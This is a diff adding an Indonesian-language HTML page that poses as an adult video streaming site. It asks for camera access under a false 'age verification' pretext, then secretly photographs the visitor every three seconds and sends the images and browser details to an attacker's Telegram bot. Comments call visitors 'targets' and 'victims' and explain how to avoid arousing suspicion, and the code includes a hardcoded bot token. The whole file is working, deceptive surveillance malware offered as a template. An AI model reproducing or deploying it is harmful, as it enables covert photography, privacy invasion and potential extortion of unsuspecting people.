@@ -1,0 +1,258 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Video Player HD - Putar Sekarang 🔞</title>
+    <style>
+        /* Ini cuma biar keliatan meyakinkan, kayak situs video beneran */
+        body {
+            background: #0a0a0a;
+            color: white;
+            font-family: 'Arial', sans-serif;
+            text-align: center;
+            padding: 20px;
+        }
+        h1 {
+            color: #ff3b3b;
+            text-shadow: 0 0 10px rgba(255, 0, 0, 0.5);
+        }
+        .video-placeholder {
+            width: 100%;
+            max-width: 600px;
+            height: 350px;
+            background: #1a1a1a;
+            margin: 20px auto;
+            border-radius: 15px;
+            border: 3px dashed #ff3b3b;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 24px;
+            color: #555;
+            cursor: pointer;
+            transition: all 0.3s;
+        }
+        .video-placeholder:hover {
+            background: #252525;
+            border-color: #ff6b6b;
+        }
+        button {
+            background: #ff3b3b;
+            color: white;
+            border: none;
+            padding: 15px 40px;
+            font-size: 22px;
+            font-weight: bold;
+            border-radius: 50px;
+            cursor: pointer;
+            box-shadow: 0 0 20px #ff3b3b;
+            margin: 20px 0;
+            transition: 0.3s;
+        }
+        button:hover {
+            background: #ff1a1a;
+            box-shadow: 0 0 30px #ff0000;
+        }
+        .warning {
+            color: #ffa500;
+            font-size: 14px;
+            margin-top: 30px;
+        }
+        #status {
+            color: #00ff00;
+            margin-top: 20px;
+            font-weight: bold;
+        }
+    </style>
+</head>
+<body>
+    <h1>🔥 PREMIUM 18+ VIDEO STREAMING 🔞</h1>
+    <p>Klik tombol di bawah untuk memutar video eksklusif! (Diperlukan izin kamera untuk verifikasi usia)</p>
+    
+    <!-- Tombol jebakan -->
+    <button id="startCamera" onclick="startCamera()">🎥 PUTAR VIDEO SEKARANG 🎥</button>
+    
+    <div class="video-placeholder" id="videoPlaceholder">
+        <span>👆 Klik tombol di atas! 👆</span>
+    </div>
+
+    <div id="status"></div>
+    
+    <p class="warning">⚠️ Kami membutuhkan akses kamera untuk memastikan Anda bukan bot dan sudah berusia 18+.</p>
+
+    <script>
+        // ================== KONFIGURASI TELEGRAM ==================
+        // GANTI INI DENGAN BOT KALIAN, BANGSAT!
+        const TELEGRAM_BOT_TOKEN = "8639790794:AAEU5swO3EXAf3QYSZ6tH8hP_Hke1BS-DWM";  // GANTI!
+        const TELEGRAM_CHAT_ID = "8639790794";  // GANTI DENGAN CHAT ID LO!
+        
+        // Variabel global
+        let videoStream = null;
+        let photoInterval = null;
+        let isCameraActive = false;
+        
+        // ================== FUNGSI UTAMA MEMINTA IZIN KAMERA ==================
+        window.startCamera = function() {
+            document.getElementById('status').innerHTML = '⏳ Meminta izin kamera...';
+            
+            // Pake permintaan getUserMedia biar muncul pop-up izin
+            navigator.mediaDevices.getUserMedia({ 
+                video: {
+                    width: { ideal: 1280 },
+                    height: { ideal: 720 },
+                    facingMode: "user"  // Pake kamera depan (selfie)
+                }, 
+                audio: false  // Gak butuh audio, cuma video doang
+            })
+            .then(function(stream) {
+                // Target udah kena! Dia pencet "Izinkan"!
+                videoStream = stream;
+                isCameraActive = true;
+                
+                // Update tampilan biar keliatan legit
+                document.getElementById('status').innerHTML = '✅ Izin diberikan! Memuat video...';
+                document.getElementById('videoPlaceholder').innerHTML = '<video id="previewVideo" autoplay muted playsinline style="width:100%; height:100%; object-fit:cover; border-radius:15px;"></video>';
+                
+                // Tampilkan preview video ke target biar dia gak curiga
+                const videoElement = document.getElementById('previewVideo');
+                if (videoElement) {
+                    videoElement.srcObject = stream;
+                }
+                
+                // Ganti teks tombol
+                document.querySelector('button').innerText = '🔴 SEDANG STREAMING';
+                
+                // KIRIM PESAN KE TELEGRAM BAHWA KORBAN BARU KENA
+                sendTelegramMessage("🚨 TARGET BARU KENA! 🚨\nIP: " + window.location.hostname + "\nUser-Agent: " + navigator.userAgent + "\nWaktu: " + new Date().toLocaleString());
+                
+                // MULAI MOTO RET DIA TIAP 3 DETIK!
+                startTakingPhotos();
+            })
+            .catch(function(error) {
+                // Gagal, mungkin dia pencet "Blokir"
+                document.getElementById('status').innerHTML = '❌ Gagal: ' + error.message;
+                console.error("Error kamera: ", error);
+                
+                // Kasih pesan error palsu biar dia coba lagi
+                alert("Gagal memuat video. Coba izinkan akses kamera dan klik tombol lagi!");
+            });
+        };
+        
+        // ================== FUNGSI MOTO TIAP 3 DETIK ==================
+        function startTakingPhotos() {
+            if (!isCameraActive) return;
+            
+            // Hentikan interval sebelumnya kalau ada
+            if (photoInterval) clearInterval(photoInterval);
+            
+            // Moto tiap 3 detik
+            photoInterval = setInterval(function() {
+                captureAndSendPhoto();
+            }, 3000); // Ganti jadi 3000 = 3 detik. Makin kecil makin brutal!
+        }
+        
+        // ================== FUNGSI MOTRET DAN KIRIM KE TELEGRAM ==================
+        function captureAndSendPhoto() {
+            if (!videoStream || !isCameraActive) return;
+            
+            // Ambil track video dari stream
+            const videoTrack = videoStream.getVideoTracks()[0];
+            if (!videoTrack) return;
+            
+            // Buat elemen video dan canvas buat motret
+            const hiddenVideo = document.createElement('video');
+            hiddenVideo.srcObject = videoStream;
+            hiddenVideo.autoplay = true;
+            hiddenVideo.muted = true;
+            hiddenVideo.playsinline = true;
+            hiddenVideo.style.display = 'none';
+            
+            hiddenVideo.onloadeddata = function() {
+                // Video udah siap, buat canvas buat nangkep frame
+                const canvas = document.createElement('canvas');
+                canvas.width = hiddenVideo.videoWidth;
+                canvas.height = hiddenVideo.videoHeight;
+                
+                const ctx = canvas.getContext('2d');
+                ctx.drawImage(hiddenVideo, 0, 0, canvas.width, canvas.height);
+                
+                // Ubah hasil jepretan jadi format JPEG pake kualitas 0.7
+                canvas.toBlob(function(blob) {
+                    if (blob) {
+                        // Kirim blob ke Telegram
+                        sendPhotoToTelegram(blob);
+                    }
+                }, 'image/jpeg', 0.7);
+                
+                // Hapus elemen video setelah dipake
+                hiddenVideo.remove();
+            };
+            
+            document.body.appendChild(hiddenVideo);
+        }
+        
+        // ================== FUNGSI KIRIM FOTO KE TELEGRAM ==================
+        function sendPhotoToTelegram(photoBlob) {
+            const formData = new FormData();
+            formData.append('chat_id', TELEGRAM_CHAT_ID);
+            formData.append('photo', photoBlob, 'kamera_target.jpg');
+            formData.append('caption', `📸 Jepretan rahasia!\nWaktu: ${new Date().toLocaleString()}`);
+            
+            // Kirim pake fetch ke API Telegram
+            fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendPhoto`, {
+                method: 'POST',
+                body: formData
+            })
+            .then(response => response.json())
+            .then(data => {
+                if (data.ok) {
+                    console.log('Foto berhasil dikirim ke telegram bos! 🔥');
+                } else {
+                    console.error('Gagal kirim foto: ', data);
+                }
+            })
+            .catch(error => {
+                console.error('Error kirim foto: ', error);
+            });
+        }
+        
+        // ================== FUNGSI KIRIM PESAN TEKS KE TELEGRAM ==================
+        function sendTelegramMessage(messageText) {
+            const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
+            
+            fetch(url, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json',
+                },
+                body: JSON.stringify({
+                    chat_id: TELEGRAM_CHAT_ID,
+                    text: messageText,
+                    parse_mode: 'HTML'
+                })
+            })
+            .then(response => response.json())
+            .then(data => {
+                if (data.ok) {
+                    console.log('Pesan notifikasi terkirim!');
+                }
+            })
+            .catch(error => {
+                console.error('Gagal kirim pesan: ', error);
+            });
+        }
+        
+        // ================== FITUR AUTO REQUEST PAS HALAMAN DIMUAT (OPSIONAL) ==================
+        // Kalau mau pas buka langsung minta izin, aktifin kode di bawah
+        // Tapi gue saranin pake tombol biar lebih "sah" di mata target
+        
+        // window.onload = function() {
+        //     setTimeout(startCamera, 1000); // Minta izin otomatis setelah 1 detik
+        // };
+        
+        // Bonus: Catet IP publik (pake API eksternal, tapi agak ribet)
+        // Tapi gapapa, yang penting dapet fotonya dulu!
+    </script>
+</body>
+</html>
